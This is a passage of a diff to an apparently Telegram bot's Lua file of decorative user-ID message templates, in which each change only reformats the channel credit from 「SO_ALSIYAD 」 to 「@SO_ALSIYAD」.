 • 🇪🇬 - 𝙼𝚂𝙶𝚂 « #msgs  🍭
 • 🇪🇬 - 𝚂𝚃𝙰𝚂𝚃 « #stast  🍭
-• 🇪🇬 - 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+• 🇪🇬 - 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 • USE ➤  #username .
 • MSG ➤  #msgs .
 • STA ➤  #stast .
 • iD ➤ #id .
-• 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+• 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
@@ -14834,7 +14836,7 @@ local List = {
 🇪?? - 𝄬 ᴵᴰ . #id 𓃠
 🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
 🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
-🇪🇬 - 𝄬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+🇪🇬 - 𝄬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 𓄼🇪🇬 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
@@ -14842,14 +14844,14 @@ local List = {
 𓄼🇪🇬 𝐢𝐝 : #id ‌‌‏⚚
 𓄼🇪🇬 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
 𓄼🇪🇬 𝑴𝒔𝒈𝒔 : #msgs 𓆊
-𓄼🇪🇬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+𓄼🇪🇬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 Usᴇʀ Nᴀᴍᴇ ~ #username 
 Yᴏᴜʀ ɪᴅ ~ #id 
 Sᴛᴀsᴛ ~ #stast 
 Msᴀɢ ~ #msgs
-𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 - 🇪🇬 UsErNaMe . #username 𖠲
@@ -14857,7 +14859,7 @@ Msᴀɢ ~ #msgs
 - 🇪🇬 Id . #id 𖠲
 - 🇪🇬 GaMeS . #game 𖠲
 - 🇪🇬 MsGs . #msgs 𖠲
-- 🇪🇬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+- 🇪🇬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 🇪🇬 - 𝄬 username . #username  𓃠
@@ -14865,7 +14867,7 @@ Msᴀɢ ~ #msgs
 🇪🇬 - ?? id . #id 𓃠
 🇪🇬 - 𝄬 gmas . #gmas 𓃠
 🇪🇬 - 𝄬 msgs . #msgs  𓃠
-🇪?? - 𝄬 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+🇪?? - 𝄬 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
@@ -14873,28 +14875,28 @@ Msᴀɢ ~ #msgs
 金 - 𝓲𝓭 . #id ⸙ 
 金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
 金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
-金 - 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+金 - 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 ➜𝗨𝗦??𝗥𝗡𝗔𝗠𝗘 : #username
 ➜𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 : #msgs
 ➜𝗦𝗧𝗔𝗧𝗦 : #stast
 ➜𝗜𝗗 : #id
-➜𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+➜𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 ⌔┇Msgs : #msgs.
 ⌔┇ID : #id.
 ⌔┇Stast : #stast.
 ⌔┇UserName : #username.
-⌔┇𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+⌔┇𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 𝒔𝒕𝒂𓂅 #stast 𓍯
 𝐮𝐬𝐞𝐫𓂅 #username 𓍯
 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯
 𝐢𝐝 𓂅 #id 𓍯
-𓂅 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+𓂅 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 - 🇪🇬 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 . #username 𖣂.
@@ -14902,7 +14904,7 @@ Msᴀɢ ~ #msgs
 - 🇪🇬 𝐢𝐝 . #id 𖣂.
 - 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
 - 🇪🇬 𝐦𝐬𝐠 . #msgs 𖣂.
-- 🇪🇬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+- 🇪🇬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
@@ -14910,7 +14912,7 @@ Msᴀɢ ~ #msgs
 ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
 ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
 ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
-ᯓ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+ᯓ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 .𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
@@ -14918,14 +14920,14 @@ Msᴀɢ ~ #msgs
 .𖣂 𝙡𝘿 , #id  🖤 ↴
 .𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
 .𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
-.𖣂 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+.𖣂 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 ➥• USE 𖦹 #username - 🇪🇬.
 ➥• MSG 𖥳 #msgs  - 🇪🇬.
 ➥• STA 𖦹 #stast - 🇪🇬.
 ➥• iD 𖥳 #id - 🇪🇬.
-➥• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+➥• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
@@ -14933,14 +14935,14 @@ Msᴀɢ ~ #msgs
 👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
 👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
 👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
-👳🏼‍♂ - 𝄬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+👳🏼‍♂ - 𝄬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
 ➮- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯. 💕
 ➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
 ➭- 𝐢𝐝 𓂅 #id 𓍯. 💕
-➭- 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+➭- 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 𓄼 ᴜѕᴇ : #username ♕
@@ -14948,7 +14950,7 @@ Msᴀɢ ~ #msgs
 𓄼 ɪᴅ : #id ‌‌‏⚚
 𓄼 ᴍѕɢ : #msgs 𓆊 
 𓐀 𝑾𝒆𝒍𝒄𝒐??𝒆 𓀃.
-𓄼 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+𓄼 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
@@ -14957,7 +14959,7 @@ Msᴀɢ ~ #msgs
 𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
 𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
 𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
-𝐓𝐓• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+𝐓𝐓• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 𝟓 𝟔 𖡻 #username  ࿇🦄
@@ -14965,7 +14967,7 @@ Msᴀɢ ~ #msgs
 𝟓 𝟔 𖡻 #auto  ࿇🦄
 𝟓 𝟔 𖡻 #stast  ࿇🦄
 𝟓 𝟔 𖡻 #id  ࿇🦄
-𝟓 𝟔 𖡻 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+𝟓 𝟔 𖡻 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 ༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺
@@ -14975,7 +14977,7 @@ Msᴀɢ ~ #msgs
 • |𝗠𝗦𝗚  ⁞ #edit
 • |𝗔𝗨𝗧𝗢 ⁞ #auto
 —————————————
-𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ┄─━━𖦹━━─┄
@@ -14986,14 +14988,14 @@ Msᴀɢ ~ #msgs
 ??𖡻 𖡋𝗔𝗨𝗧𝗢• #auto •𓀎
 𖣰𖡻 𖡋𝗘𝗗𝗜𝗧• #edit • 𓀎
 ┄─━━𖦹━━─┄
-𝗖𝗛 - 「SO_ALSIYAD 」  𖦹 .
+𝗖𝗛 - 「@SO_ALSIYAD」  𖦹 .
 ]],
 [[
 𖤍 |↶ #id    ꙰🇪🇬.
 𖤍 |↶ #username    ꙰🇪🇬.
 𖤍 |↶ #msgs    ꙰🇪🇬.
 𖤍 |↶ #stast    ꙰🇪🇬.
-𖤍 |↶ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𖤍 |↶ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -15002,7 +15004,7 @@ Msᴀɢ ~ #msgs
  𝗦𝗧𝗔 ⟿ #stast  « 
  𝗜𝗗  ⟿ #id  « 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 🇪🇬≪💎≫ #username • メ
@@ -15010,21 +15012,21 @@ Msᴀɢ ~ #msgs
 🇪🇬≪💎≫ #id  • メ
 🇪🇬≪💎≫ #msgs  •メ
 🇪🇬≪💎≫ #game •メ
-🇪🇬𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+🇪🇬𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
  𝚄𝚂𝙴?? 𓄹𓄼 #username
  𝙸𝙳  𓄹𓄼 #id 
  𝚂𝚃𝙰 𓄹𓄼 #stast 
  𝙼𝚂𝙶𝚂𓄹𓄼 #msgs
- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
 𓅓➪ : Iᗪ : #id - ❦ . 
 𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
 𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
-𓅓➪ : 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𓅓➪ : 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 - ايديڪ  ⁞ #id 💘 ٬
@@ -15032,14 +15034,14 @@ Msᴀɢ ~ #msgs
 - رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
 - رتبتڪ الحلوه ⁞ #stast  💘٬
 - سحڪاتڪ الفول ⁞ #edit 💘 ٬
-- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+- 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
 𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
 𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
 𓁷 - 𝙞𝙙 †: #id 𓀀 .
-𓁷 - 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𓁷 - 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𖡋 𝐔𝐒𝐄 #username 
@@ -15047,7 +15049,7 @@ Msᴀɢ ~ #msgs
 𖡋 𝐒𝐓𝐀 #stast 
 𖡋 𝐈𝐃 #id 
 𖡋 𝐄𝐃𝐈𝐓 #edit
-𖡋 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𖡋 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
@@ -15055,7 +15057,7 @@ Msᴀɢ ~ #msgs
 𖤂 ~ 𝑠𝑡𝑎 #stast  
 𖤂 ~ 𝑖𝑑 #id 𖤐
 𖤂 ~ 𝑒𝑑𝑖𝑡 #edit 𖤐
-𖤂 ~ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𖤂 ~ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 -›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
@@ -15063,7 +15065,7 @@ Msᴀɢ ~ #msgs
 -›   𝙸𝙳 . #id 🇪🇬 ꙰ 
 -›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
 -›   𝙼??𝙶𝚂 . #msgs 🇪🇬 ꙰
--›   𝗖𝗛 - 「SO_ALSIYAD 」 🇪🇬 ꙰.
+-›   𝗖𝗛 - 「@SO_ALSIYAD」 🇪🇬 ꙰.
 ]],
 [[
 ••• ••• ••• ••• ••• ••• ••• 
@@ -15072,21 +15074,21 @@ Msᴀɢ ~ #msgs
  ࿕ ¦• 𝙂𝙈𝘼𝙎  ⟿ #stast ༆
  ࿕ ¦• 𝙏𝘿 𝙎𝙏𝘼  ⟿ #id ༆
 ••• ••• ••• ••• ••• ••• •••
- ࿕ ¦• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+ ࿕ ¦• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
 ► 𝗜?? #id 𓃚 ꙰
 ► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
 ► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
-► 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+► 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 - UsEr🇪🇬 ꙰ #username
 - StA🇪🇬 ꙰   #msgs
 - MsGs🇪🇬 ꙰ #stast
 - ID🇪🇬 ꙰  #id
-- 𝗖𝗛 🇪🇬 ꙰  「SO_ALSIYAD 」 ⦁
+- 𝗖𝗛 🇪🇬 ꙰  「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -15095,14 +15097,14 @@ Msᴀɢ ~ #msgs
 🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
 🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🇪🇬 - 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+🇪🇬 - 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 - 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
 - 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
 - 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
 - 𓏬 𝐈𝐃 : #id 𓂅 .
-- 𓏬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+- 𓏬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ᯓ 𝟔𝟔𝟔 𖡋 #username •✟
@@ -15110,28 +15112,28 @@ Msᴀɢ ~ #msgs
 ᯓ 𝟔𝟔𝟔𖡋 #id  • ✟
 ᯓ 𝟔𝟔𝟔𖡋 #msgs  •✟ 
 ᯓ 𝟔𝟔𝟔𖡋 #game •✟
-ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
  ⦁•𝐮𝐬𝐞𝐫 : #username 𖣬  
  ⦁•𝐦𝐬𝐠  : #msgs 𖣬 
  ⦁•𝐬𝐭𝐚 : #stast 𖣬 
  ⦁•𝐢𝐝  : #id 𖣬
- ⦁•𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+ ⦁•𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 - ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
 - ᴍѕɢѕ ➣ #msgs .
 - ѕᴛᴀᴛѕ ➣ #stast .
 - ʏᴏᴜʀ ɪᴅ ➣ #id  .
-- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+- 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 - ᴜѕʀ: #username ঌ.
 - ᴍѕɢ: #msgs  ঌ.
 - ѕᴛᴀ: #stast  ঌ.
 - ɪᴅ: #id ঌ.
-- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+- 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 - 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ⟿ #username
@@ -15139,14 +15141,14 @@ Msᴀɢ ~ #msgs
 - 𝑖𝑑 ⟿ #id
 - 𝑒𝑑𝑖𝑡 ⟿ #edit
 - 𝑔𝑎𝑚𝑒 ⟿ #game
-- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+- 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 🌯 ¦✙• 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 ➢ ⁞  #username 🇪🇬
 🌯 ¦✙• 𝐦𝐬𝐠 ➢ ⁞  #msgs  📝
 🌯 ¦✙• 𝒓𝒂𝒏𝒌 ➢ ⁞ #stast  
 🌯 ¦✙• 𝐢𝐝 𝒔𝒕𝒂 ➢ ⁞ #id  🆔
-🌯 ¦ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+🌯 ¦ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -15155,28 +15157,28 @@ Msᴀɢ ~ #msgs
 🇪🇬 ꙰  - 𝚐 𝚖 𝚊𝚜  ➟ #stast ❃.
 🇪🇬 ꙰  - 𝙸𝙳 𝚜𝚝𝚊   ➟ #id ❃.
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🇪🇬 ꙰  - 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+🇪🇬 ꙰  - 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ⌔➺: Msgs : #msgs - 🔹.
 ⌔➺: ID : #id - 🔹.
 ⌔➺: Stast : #stast -🔹.
 ⌔➺: UserName : #username -🔹.
-⌔➺: 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+⌔➺: 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ¦• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇪🇬.
 ¦• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇪🇬.
 ¦• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇪🇬.
 ¦• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇪🇬.
-¦• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+¦• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
 ➞: 𝐮𝐬𝐞𝐫𓂅 #username 𓍯➸💞.
 ➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
 ➞: ??𝒅 𓂅 #id 𓍯➸💞.
-➞: 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+➞: 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ➼ : 𝐼𝐷 𖠀 #id . ♡
@@ -15184,14 +15186,14 @@ Msᴀɢ ~ #msgs
 ➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
 ➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
 ➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
-➼ : 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+➼ : 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ▽ ¦❀• USER ➭ ⁞ #username .
 ▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
 ▽ ¦❀• STAT ➬ ⁞ #stast  .
 ▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
-▽ ¦❀• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+▽ ¦❀• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 • ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
@@ -15199,14 +15201,14 @@ Msᴀɢ ~ #msgs
 • ❉ 𝑰𝑫 : #id  ‌‌‏.
 • ❉  𝑴𝑺𝑮 : #msgs 𓆊.
 • ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
-• ❉ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+• ❉ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 |USERNAME #username 𓃚
 | YOUR -ID - #id 𓃚
 | STAS-#stast 𓃚
  | MSAG - #msgs 𓃚
- | 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+ | 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𝟔𝟔𝟔 𖡋 #username • 𖣰💞
@@ -15214,14 +15216,14 @@ Msᴀɢ ~ #msgs
 𝟔??𝟔 𖡋 #id • 𖣰💞
 𝟔𝟔𝟔 𖡋 #game • 𖣰💞
 𝟔𝟔𝟔 𖡋 #msgs • 𖣰💞
-𝟔𝟔𝟔 𖡋 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𝟔𝟔𝟔 𖡋 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ⌔➺: Msgs : #msgs - 🔹.
 ⌔➺: ID : #id - 🔹.
 ⌔➺: Stast : #stast -🔹.
 ⌔➺: UserName : #username -🔹.
-⌔➺: 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+⌔➺: 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
  ⦁ - 𝓾𝓼𝓮𝓻 ➪ #username ⦁.
@@ -15229,42 +15231,42 @@ Msᴀɢ ~ #msgs
  ⦁ - 𝓲𝓭 ➪ #id ⸙ ⦁.
  ⦁ - 𝓰𝓶𝓪𝓼 ➪ #gmas ⸙ ⦁.
  ⦁ - 𝓶𝓼𝓰𝓼 ➪ #msgs ⦁.
- ⦁ - 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+ ⦁ - 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
 ◣: 𝐮𝐬𝐞𝐫𓂅 #username 𓍯➥♡.
 ◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
 ◣: 𝐢𝐝 𓂅 #id 𓍯➥♡.
-◣: 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+◣: 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 - 𝄬 username . #username ➪🇪🇬
  - 𝄬 stast . #stast ➪🇪🇬
  - 𝄬 id . #id ➪🇪🇬
  - 𝄬 msgs . #msgs ➪🇪🇬
- - 𝄬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+ - 𝄬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ↣• USE ➤ #username  ↝🍬.
 ↣• MSG ➤  #msgs  ↝🍬.
 ↣• STA ➤  #stast  ↝🍬.
 ↣• iD ➤ #id  ↝🍬.
-↣• 𝗖𝗛 - 「SO_ALSIYAD 」 🍬
+↣• 𝗖𝗛 - 「@SO_ALSIYAD」 🍬
 ]],
 [[
 ➫✿: S #stast 𓍯➟♡.
 ➫✿: U𓂅 #username 𓍯➟♡.
 ➫✿: M𓂅 #msgs 𓍯➟♡.
 ➫✿:  I  #id ➟♡.
-➫✿: 𝗖?? - 「SO_ALSIYAD 」 ♡.
+➫✿: 𝗖?? - 「@SO_ALSIYAD」 ♡.
 ]],
 [[
 ✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
 ✶- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯↝❃.
 ✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
 ✶- 𝐢𝐝 𓂅 #id 𓍯↝❃.
-✶- 𝗖𝗛 - 「SO_ALSIYAD 」 ↝❃.
+✶- 𝗖𝗛 - 「@SO_ALSIYAD」 ↝❃.
 ]],
 [[
 • 🖤 | 𝑼𝑬𝑺 :  #username
@@ -15275,14 +15277,14 @@ Msᴀɢ ~ #msgs
 
 • 🖤 | 𝑴𝑺𝑮 : #msgs
 
-• 🖤 | 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+• 🖤 | 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 • USE 𖦹 #username 
 • MSG 𖥳 #msgs  
 • STA 𖦹 #stast 
 • iD 𖥳 #id
-• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 🌨↓Use ⇨ #username 🌨
@@ -15299,7 +15301,7 @@ Msᴀɢ ~ #msgs
 - ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
 - ᴅᴇᴛᴀɪʟs ➣ #auto . 
 -  ɢᴀᴍᴇ ➣ #game .
-- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+- 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ⚕𝙐𝙎𝙀𝙍??𝘼𝙈𝙀 : #username
@@ -15308,7 +15310,7 @@ Msᴀɢ ~ #msgs
 ⚕𝙄𝘿 : #id
 ⚕??𝙀𝙒𝙀𝙇𝙎 : #game
 ⚕𝘿𝙀𝙑 : #ridha
-⚕𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+⚕𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 • 🦄 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
@@ -15316,7 +15318,7 @@ Msᴀɢ ~ #msgs
 • 🦄 | 𝑰𝑫 : #id ‌‌‏♕
 • 🦄 | 𝑴𝑺𝑮 : #msgs 𓆊
 • 🦄 | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 : ⁞
-• 🦄 | 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+• 🦄 | 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 • △ | 𝑼𝑬𝑺 : #username ‌‌‏⚚
@@ -15324,7 +15326,7 @@ Msᴀɢ ~ #msgs
 • ⊠ | 𝑰𝑫 : #id ‌‌‏♕
 • ❏ | 𝑴𝑺𝑮 : #msgs 𓆊
 • ❏ | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 :
-• ❏ | 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+• ❏ | 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ┇iD ➺ #id 💘
@@ -15332,21 +15334,21 @@ Msᴀɢ ~ #msgs
 ┇MsG ➺ #msgs 🧸 
 ┇StAtE ➺ #stast 🎀
 ┇EdIT ➺ #edit  💒
-┇𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+┇𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 • 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
 • 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
 • 🖤 | 𝑰𝑫 : #id ‌‌‏♕
 • 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
-• 🖤 | 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+• 🖤 | 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𓄼 ᴜѕᴇ : #username ♕
 𓄼 ѕᴛᴀ : #stast ☥
 𓄼 ɪᴅ : #id ‌‌‏⚚
